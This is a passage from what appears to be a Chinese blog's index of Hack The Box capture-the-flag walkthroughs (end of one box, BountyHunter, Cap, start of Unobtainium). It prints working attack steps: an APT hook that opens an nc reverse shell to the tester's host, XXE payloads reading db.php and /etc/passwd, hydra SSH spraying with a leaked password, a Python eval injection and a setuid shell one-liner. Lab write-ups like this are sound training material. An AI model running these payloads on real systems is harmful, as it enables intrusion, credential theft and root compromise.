9VX8nhwVoRGuf8QmD0beSm8WUb8wKBVkmNoPZNGNJb0xvSmFEJ/\nBwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh54f\nNwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==\n-----END OPENSSH PRIVATE KEY-----\n```\n给予权限\n\n```Plain Text\nchmod 600 id_rsa\n```\n然后使用ssh进行登录john用户\n\n```Plain Text\nssh john@10.10.11.101 -i id_rsa\n```\n登入后提权 > 参考连接\n\n> https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/\n\n```Plain Text\ncd /etc/apt/apt.conf.d\n\necho 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.110 4444 >/tmp/f\"};' > exp\n```\n然后本地监听一个端口\n\n```Plain Text\nnc -nvlp 4444\n```\n然后等着root执行该脚本即可，可能需要等几分钟\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 41008\n/bin/sh: 0: can't access tty; job control turned off\n# whoami && id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到root\n\n```Plain Text\n# cat root.txt\n3664a02fe4477fdc202e27ec4e29de82\n```\n成功拿到root权限的flag","tags":["Hackthebox"]},{"title":"BountyHunter - Hackthebox","url":"/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/","content":"\n# Hackthebox - BountyHunter\n## 靶场信息\n![](Hackthebox-BountyHunter/498c133a-fe2b-4ecc-857f-88db9ac41a1d.png)\n\n## 靶场类型\n![](Hackthebox-BountyHunter/89afe67a-26ef-4502-8682-01d900757f3c.png)\n\n## 信息搜集\n使用nmap进行端口扫描\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.11.100\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 13:02 CST\nNmap scan report for 10.10.11.100\nHost is up (0.25s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)\n|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)\n|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Bounty Hunters\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/25%OT=22%CT=1%CU=31546%PV=Y%DS=2%DC=T%G=Y%TM=60FCF27\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   251.53 ms 10.10.14.1\n2   251.65 ms 10.10.11.100\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 546.93 seconds\n```\n从扫描结果中，我们可以得到如下几个信息： - 本台靶机开启了`22`、`80`端口 - 本台80端口使用了Apache/2.4.41作为HTTP服务\n\n咱们去访问80端口看看内容。\n\n![](Hackthebox-BountyHunter/78dd4165-7463-4056-b3e9-23293d145873.png)\n\n这好像是一个SRC平台？专业对口\n\n发现了一个php文件\n\n```Plain Text\nhttp://10.10.11.100/log_submit.php\n```\n简单测试了一下XSS，但是没有成功，先放着不管我们找找其他思路\n\n先做一个FUZZ看看吧\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.100\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/25 13:24:30 Starting gobuster in directory enumeration mode\n===============================================================\n/.htpasswd            (Status: 403) [Size: 277]\n/.hta.txt             (Status: 403) [Size: 277]\n/.htaccess            (Status: 403) [Size: 277]\n/.htaccess.php        (Status: 403) [Size: 277]\n/.htpasswd.php        (Status: 403) [Size: 277]\n/.hta                 (Status: 403) [Size: 277]\n/.hta.php             (Status: 403) [Size: 277]\n/.htaccess.html       (Status: 403) [Size: 277]\n/.htpasswd.html       (Status: 403) [Size: 277]\n/.hta.html            (Status: 403) [Size: 277]\n/.htaccess.txt        (Status: 403) [Size: 277]\n/.htpasswd.txt        (Status: 403) [Size: 277]\n/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]\n/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]\n/db.php               (Status: 200) [Size: 0]\n/index.php            (Status: 200) [Size: 25169]\n/index.php            (Status: 200) [Size: 25169]\n/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]\n/portal.php           (Status: 200) [Size: 125]\n/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]\n/server-status        (Status: 403) [Size: 277]\n\n===============================================================\n2021/07/25 13:32:25 Finished\n===============================================================\n```\n咱们看看`/resources`目录\n\n```Plain Text\nIndex of /resources\n[ICO]   Name    Last modified   Size    Description\n[PARENTDIR] Parent Directory        -\n[TXT]   README.txt  2021-04-06 00:01    210\n[   ]   all.js  2021-04-05 17:37    1.1M\n[   ]   bootstrap.bundle.min.js 2021-04-05 17:41    82K\n[   ]   bootstrap_login.min.js  2021-04-05 17:08    48K\n[   ]   bountylog.js    2021-06-15 15:47    594\n[   ]   jquery.easing.min.js    2020-05-04 09:11    2.5K\n[   ]   jquery.min.js   2020-05-04 16:01    87K\n[   ]   jquery_login.min.js 2021-04-05 17:09    85K\n[TXT]   lato.css    2021-04-05 17:39    2.6K\n[TXT]   monsterat.css   2021-04-05 17:39    3.2K\nApache/2.4.41 (Ubuntu) Server at 10.10.11.100 Port 80\n```\n咱们挨个查看一下\n\n在`README.txt`中发现了一个提示\n\n```Plain Text\nTasks:\n\n[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.\n[X] Write tracker submit script\n[ ] Connect tracker submit script to the database\n[X] Fix developer group permissions\n```\n咱们把目光放在`/bountylog.js`这个文件上\n\n```Plain Text\nfunction returnSecret(data) {\n    return Promise.resolve($.ajax({\n            type: \"POST\",\n            data: {\"data\":data},\n            url: \"tracker_diRbPr00f314.php\"\n            }));\n}\n\nasync function bountySubmit() {\n    try {\n        var xml = `<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n        <bugreport>\n        <title>${$('#exploitTitle').val()}</title>\n        <cwe>${$('#cwe').val()}</cwe>\n        <cvss>${$('#cvss').val()}</cvss>\n        <reward>${$('#reward').val()}</reward>\n        </bugreport>`\n        let data = await returnSecret(btoa(xml));\n        $(\"#return\").html(data)\n    }\n    catch(error) {\n        console.log('Error:', error);\n    }\n}\n```\n## 漏洞利用\n看到这里咱们梳理一下思路哈\n\n1. `http://10.10.11.100/log_submit.php`中提示是一个提交窗口\n2. `http://10.10.11.100/resources/README.txt`中提示我们要写一个提交脚本到数据库，但我们目前并不知道要写什么脚本\n3. `http://10.10.11.100/resources/bountylog.js`中提示我们要编写一个XML脚本提交到`tracker_diRbPr00f314.php`，并且给出了我们脚本格式\n4. 我们访问`tracker_diRbPr00f314.php`后可以看到，内容就是`http://10.10.11.100/log_submit.php`提交后返回的内容\n\n平时我是不会写这么详细的，这里单纯是怼某个说我抄别人内容的杠精，给你看看我的解题思路，看看到底是抄的别人的还是我自己想的，实名制DISS你，不服随时来杠\n\n然后咱们整理一下手上有的信息 1. 咱们手里有一个提交窗口`/log_submit.php` 2. 咱们有一个一看就很重要但没有内容的文件`/db.php` 3. 有一个XML注入的示例脚本\n\nOK，目标很明确了，咱们使用XML注入去读取`/db.php`文件的内容即可\n\n针对该目标编写脚本\n\n```Plain Text\nvar xml = `<?xml  version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/db.php\"> ]>\n        <bugreport>\n        <title>&xxe;</title>\n        <cwe>something</cwe>\n        <cvss>something</cvss>\n        <reward>something</reward>\n        </bugreport>`\n```\n提交到控制台，然后使用\n\n```Plain Text\nreturnSecret(btoa(xml));\n```\n来进行读取\n\n![](Hackthebox-BountyHunter/63afcad2-5b03-47f3-a226-e3a036efece1.png)\n\n成功读取到该文件，咱们看看内容是什么\n\n```Plain Text\nIf DB were ready, would have added:\n<table>\n  <tr>\n    <td>Title:</td>\n    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>\n  </tr>\n  <tr>\n    <td>CWE:</td>\n    <td>something</td>\n  </tr>\n  <tr>\n    <td>Score:</td>\n    <td>something</td>\n  </tr>\n  <tr>\n    <td>Reward:</td>\n    <td>something</td>\n  </tr>\n</table>\n\n```\n看title返回的内容是一段base64码，咱们去解密试试\n\n```Plain Text\nPD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=\n\n<?php\n// TODO -> Implement login system with the database.\n$dbserver = \"localhost\";\n$dbname = \"bounty\";\n$dbusername = \"admin\";\n$dbpassword = \"m19RoAU0hP41A1sTsq6K\";\n$testuser = \"test\";\n?>\n```\n咱们得到了数据库的账号密码，咱们读取`/etc/passwd`看看\n\n```Plain Text\nvar xml = `<?xml  version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> ]>\n        <bugreport>\n        <title>&xxe;</title>\n        <cwe>something</cwe>\n        <cvss>something</cvss>\n        <reward>something</reward>\n        </bugreport>`\n```\n```Plain Text\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndevelopment:x:1000:1000:Development:/home/development:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n```\n似乎和我想的不一样啊，这里我们获取到的数据库用户名无法用来进行ssh登录，还得找找其他思路\n\n咱们使用hydra进行爆破试试\n\n首先将`/etc/passwd`的文件保存到本地\n\n然后使用cut命令来提取用户名\n\n```Plain Text\ncut -d : -f 1 passwd > user\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# cat user\nroot\ndaemon\nbin\nsys\nsync\ngames\nman\nlp\nmail\nnews\nuucp\nproxy\nwww-data\nbackup\nlist\nirc\ngnats\nnobody\nsystemd-network\nsystemd-resolve\nsystemd-timesync\nmessagebus\nsyslog\n_apt\ntss\nuuidd\ntcpdump\nlandscape\npollinate\nsshd\nsystemd-coredump\ndevelopment\nlxd\nusbmux\n```\n现在就把所有的用户名都提取出来了\n\n然后使用hydra进行爆破\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh                                                                                                                                                  255 ⨯\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 14:42:27\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task\n[DATA] attacking ssh://10.10.11.100:22/\n[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K\n[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K\n1 of 1 target successfully completed, 2 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 14:42:44\n```\n然后确定了账号密码\n\n```Plain Text\nusername = development\npassword = m19RoAU0hP41A1sTsq6K\n```\n咱们使用ssh进行登录\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ssh development@10.10.11.100\ndevelopment@10.10.11.100's password:\nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun 25 Jul 2021 06:57:17 AM UTC\n\n  System load:           0.0\n  Usage of /:            24.3% of 6.83GB\n  Memory usage:          15%\n  Swap usage:            0%\n  Processes:             216\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.100\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:7ae5\n\n0 updates can be applied immediately.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Jul 25 04:44:41 2021 from 10.10.14.17\ndevelopment@bountyhunter:~$ whoami && id\ndevelopment\nuid=1000(development) gid=1000(development) groups=1000(development)\n```\n成功getshell\n\n```Plain Text\ndevelopment@bountyhunter:~$ cat user.txt\n12df9cbc3e04ef498fad5cdd101563b4\n```\n成功拿到user权限的flag ## 权限提升 咱们使用sudo -l查看一下权限\n\n```Plain Text\ndevelopment@bountyhunter:~$ sudo -l\nMatching Defaults entries for development on bountyhunter:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser development may run the following commands on bountyhunter:\n    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py\n```\n咱们可以利用`/usr/bin/python3.8`使用root权限无密码运行`/opt/skytrain_inc/ticketValidator.py`文件\n\n咱们查看一下这个文件\n\n```Plain Text\ndevelopment@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py\n#Skytrain Inc Ticket Validation System 0.1\n#Do not distribute this file.\n\ndef load_file(loc):\n    if loc.endswith(\".md\"):\n        return open(loc, 'r')\n    else:\n        print(\"Wrong file type.\")\n        exit()\n\ndef evaluate(ticketFile):\n    #Evaluates a ticket to check for ireggularities.\n    code_line = None\n    for i,x in enumerate(ticketFile.readlines()):\n        if i == 0:\n            if not x.startswith(\"# Skytrain Inc\"):\n                return False\n            continue\n        if i == 1:\n            if not x.startswith(\"## Ticket to \"):\n                return False\n            print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\")\n            continue\n\n        if x.startswith(\"__Ticket Code:__\"):\n            code_line = i+1\n            continue\n\n        if code_line and i == code_line:\n            if not x.startswith(\"**\"):\n                return False\n            ticketCode = x.replace(\"**\", \"\").split(\"+\")[0]\n            if int(ticketCode) % 7 == 4:\n                validationNumber = eval(x.replace(\"**\", \"\"))\n                if validationNumber > 100:\n                    return True\n                else:\n                    return False\n    return False\n\ndef main():\n    fileName = input(\"Please enter the path to the ticket file.\\n\")\n    ticket = load_file(fileName)\n    #DEBUG print(ticket)\n    result = evaluate(ticket)\n    if (result):\n        print(\"Valid ticket.\")\n    else:\n        print(\"Invalid ticket.\")\n    ticket.close\n\nmain()\n```\n通过解读这个python脚本，我们得知，这个脚本要求我们输入文件名，且文件名要以`.md`为结尾。如果条件满足，则脚本打开文件并搜索下一个条件。\n\n```Plain Text\nfor i,x in enumerate(ticketFile.readlines()):\n\n        if i == 0: # if line number 0 not startwith \"# Skytrain Inc\", Quit, else Continue\n            if not x.startswith(\"# Skytrain Inc\"):\n                return False\n            continue\n        if i == 1: if line number 1 Exist and not startwith \"## Ticket to \" , Quit else Continue\n            if not x.startswith(\"## Ticket to \"):\n                return False\n            print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\")\n            continue\n\n    if x.startswith(\"__Ticket Code:__\"): # This is line number 2, as the previous statements are all returned out or continued to here. so line number 2 should be: \"__Ticket Code:__\"\n            code_line = i+1\n            continue\n\nif code_line and i == code_line: # if code_line exist\n            if not x.startswith(\"**\"): # if code_line not startwith **, Exit!\n                return False\n            ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] # Remove ** from Code Line, and split at pos 0 where + is found. example is: **102+, would become just 102\n            if int(ticketCode) % 7 == 4:  # the tricky part!\n                validationNumber = eval(x.replace(\"**\", \"\")) # this is confusing! that is the catch, the code does not eval the splitted ticketCode, but actually the line itself just without any **. so you should just pass a line of code that would work.\n```\n那咱们编写一个`.md`文件让他满足条件即可\n\n```Plain Text\n# Skytrain Inc\n## Ticket to\n__Ticket Code:__\n**102+ 10 == 112 and __import__('os').system('cat /root/root.txt') == False\n```\n咱们运行一下\n\n```Plain Text\ndevelopment@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py\nPlease enter the path to the ticket file.\nlucifiel.md\nDestination:\nb320161d15bd03095cb66d05ac6d4ddf\nInvalid ticket.\n```\n成功获得root权限的flag文件","tags":["Hackthebox"]},{"title":"Cap - Hackthebox","url":"/2021/07/17/Hackthebox/Easy/Hackthebox-Cap/","content":"\n# Hackthebox - Cap\nHackTheBox在凌晨三点发布了一个新的靶场，在漫长的等待之后，靶机上线了，第一时间访问，开干\n\n![](Hackthebox-Cap/598bf432-0c5f-475c-84b3-c8df4e777a0b.png)\n\n连接vpn之后打开站点\n\n![](Hackthebox-Cap/c900fdcc-b1b5-4883-ab97-14e2b7eb117e.png)\n\n一度以为复制错了ip。。。。。。查看信息之后发现Security Snapshot(5 Second PCAP + Analysis)\n\n为数据包可下载\n\n![](Hackthebox-Cap/bffb30b7-95d4-454e-b03e-ffc1c400be58.png)\n\n果断下载之后用wireshark打开\n\n![](Hackthebox-Cap/e7107aed-c2aa-4a1c-a022-97f1db54e45f.png)\n\n？？？空白，这怕是下载了个假的，和朋友确认后发现是因为还没有产生数据包，刷新之后\n\n![](Hackthebox-Cap/e44ee337-3d04-4a41-bbec-8daa50c8a756.png)\n\n哦吼，产生了数据包，下载打开\n\n![](Hackthebox-Cap/705de063-aa36-4c07-a859-ec9a501ba9a4.png)\n\n数据包没发现有用的信息，但下载的数据包命名和网址后缀的数字相同引起了注意，\n\n![](Hackthebox-Cap/e20f0014-3251-46de-bcbc-5fd9d19bb074.png)\n\n既然相同且刷新之后回生成新的，那么便可以尝试修改，果断改成0，\n\n![](Hackthebox-Cap/03c96b59-df9f-41b6-b601-6730e4ef6301.png)\n\n果然，有了信息，下载之后再次用wireshark打开\n\n![](Hackthebox-Cap/48e94750-4a1d-40f0-b6e2-546570589cc3.png)\n\n这不就有了吗，查看数据包，成功找到账号密码\n\n![](Hackthebox-Cap/a3baa556-c481-45f1-a64e-cc7c5a6daf8b.png)\n\n由于数据包是ftp的，直接尝试登录ftp\n\n![](Hackthebox-Cap/8eefb9c8-1f87-493d-8955-2f89c0305e9f.png)\n\n成功登录ftp，拿到普通用户flag。扫描端口得知开启21、22、80端口\n\n![](Hackthebox-Cap/62f795f4-6343-40a8-8f6c-676e72bdcaa0.png)\n\n尝试用该账号密码登录ssh\n\n![](Hackthebox-Cap/d5c8be59-7a95-44ef-a26e-626d9d7e1ad7.png)\n\n成功拿到普通用户权限，开始提权拿到root权限，sudo –l\n\n![](Hackthebox-Cap/13cc0a0c-6452-4691-9704-0390bf12ff80.png)\n\n该用户不能在这台靶机上sudo，脑阔疼，接着找其他信息，在尝试过suid提权，本地提权，内核提权均无果后，抽了根烟，找一些提权相关的文章\n\n第二天在朋友的帮助下利用python3提权，使用python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'命令\n\n![](Hackthebox-Cap/9bf35bb4-9c4a-4b3b-9b70-7beee16a1393.png)\n\n可以看到已经获得到root权限，find搜索一下存在的关于root的目录，看到/root\n\n![](Hackthebox-Cap/c5c2e81b-487a-4378-af9c-5e7d3f0d18cf.png)\n\n![](Hackthebox-Cap/6a4b0b2d-7cb2-4a76-be4f-249aa67bf6bf.png)\n\n进到root目录看到root.txt，拿到root权限的flag\n\n![](Hackthebox-Cap/5a8e946b-f71b-437d-9465-0d3b1d20439e.png)\n\n提交，完活\n\n![](Hackthebox-Cap/f74e3eeb-26fd-4819-852e-f90966f37b44.png)\n\n注意： 1、关注url的变化，里面可能存在某些信息\n\n2、分析流量包，找寻关键信息\n\n3、思维扩散，找寻可能存在可利用的点","tags":["Hackthebox"]},{"title":"Unobtainium - Hackthebox","url":"/2021/07/17/Hackthebox/Hard/Hackthebox-Unobtanium/","content":"\n# Hackthebox - Unobtainium\n# Hackthebox - Unobtainium 靶场实战\n## 靶场信息\n![](Hackthebox-Unobtanium/image1.png)\n\n## 靶场类型\n![](Hackthebox-Unobtanium/image2.png)\n\n## 信息搜集 首先使用nmap进行端口扫描\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.10.235\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 22:08 CST\nNmap scan report for 10.10.10.235\nHost is up (0.27s latency).\nNot shown: 65527 closed ports\nPORT      STATE SERVICE          VERSION\n22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)\n|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)\n|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)\n80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Unobtainium\n2379/tcp  open  ssl/etcd-client?\n| ssl-cert: Subject: commonName=unobtainium\n| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2021-01-17T07:10:30\n|_Not valid after:  2022-01-17T07:10:30\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  h2\n| tls-nextprotoneg:\n|_  h2\n2380/tcp  open  ssl/etcd-server?\n| ssl-cert: Subject: commonName=unobtainium\n| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2021-01-17T07:10:30\n|_Not valid after:  2022-01-17T07:10:30\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  h2\n| tls-nextprotoneg:\n|_  h2\n8443/tcp  open  ssl/https-alt\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.0 403 Forbidden\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39\n|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd\n|     Date: Thu, 15 Jul 2021 14:50:44 GMT\n|     Content-Length: 212\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   GenericLines:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest:\n|     HTTP/1.0 403 Forbidden\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39\n|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd\n|     Date: Thu, 15 Jul 2021 14:50:42 GMT\n|     Content-Length: 185\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   HTTPOptions:\n|     HTTP/1.0 403 Forbidden\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39\n|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd\n|     Date: Thu, 15 Jul 2021 14:50:43 GMT\n|     Content-Length: 189\n|_    {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|_http-title: Site doesn't have a title (application/json).\n| ssl-cert: Subject: commonName=minikube/organizationName=system:masters\n| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP 